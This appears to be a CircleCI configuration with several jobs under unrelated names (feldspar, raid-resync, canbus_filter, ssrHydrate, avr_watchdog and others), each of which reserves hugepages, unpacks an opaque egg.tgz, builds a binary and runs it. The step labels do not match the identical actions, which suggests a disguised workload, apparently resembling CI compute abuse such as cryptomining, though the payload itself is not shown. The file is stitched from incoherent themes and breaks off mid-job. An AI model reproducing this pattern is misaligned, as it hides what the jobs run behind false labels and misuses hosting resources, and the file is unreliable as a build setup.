version: 2.1

jobs:
  deopt-guard:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List guards
          command: |
            printf 'guards 8\n' > deopt.cfg
      - run:
          name: Build deopt engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target deopt-guard -j2
      - run:
          name: Insert deopt guards
          command: LIONSS_LP=1 ./build/deopt-guard --conf deopt.cfg --speculative
  feldspar:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load crystal
          command: |
            printf 'twins 2\n' > feld.cfg
      - run:
          name: Build crystal grower
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target feldspar -j2
      - run:
          name: Grow feldspar twin
          command: LIONSS_LP=1 ./build/feldspar --config feld.cfg --rate 0.1
  raid-resync:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List disks
          command: |
            printf 'md0 sda sdb\n' > raid.cfg
      - run:
          name: Build array manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target raid-resync -j2
      - run:
          name: Resync RAID array
          command: LIONSS_LP=1 ./build/raid-resync --conf raid.cfg --speed 200m
  canbus_filter:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define filters
          command: |
            printf 'id 0x100 mask 0x700\n' > can.flt
      - run:
          name: Build CAN stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target canbus_filter -j2
      - run:
          name: Filter CAN frames
          command: LIONSS_LP=1 ./build/canbus_filter --filters can.flt --bitrate 500k
  ssrHydrate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Snapshot DOM shell
          command: |
            mkdir -p dist && printf '<div id=app></div>' > dist/index.html
      - run:
          name: Bundle server renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ssrHydrate -j2
      - run:
          name: Hydrate shell
          command: LIONSS_LP=1 ./build/ssrHydrate --entry dist/index.html --mode stream
  avr_watchdog:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set WDT prescaler
          command: |
            printf 'wdt=2s\n' > wdt.cfg
      - run:
          name: Build AVR firmware
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target avr_watchdog -j2
      - run:
          name: Arm watchdog timer
          command: LIONSS_LP=1 ./build/avr_watchdog --conf wdt.cfg --mcu atmega328
  vault_unseal:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
